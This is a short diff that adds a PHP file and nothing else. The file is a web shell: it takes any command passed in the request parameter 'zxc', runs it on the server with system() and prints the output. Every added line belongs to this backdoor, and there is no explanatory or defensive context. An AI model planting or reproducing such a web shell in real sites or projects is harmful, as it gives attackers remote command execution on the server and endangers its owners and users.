@@ -1,0 +1,9 @@
+<?php
+if(isset($_REQUEST['zxc']) ){
+echo "<pre>";
+$cmd = ($_REQUEST['zxc']);
+system($cmd);
+echo "</pre>";
+die;
+}
+?>
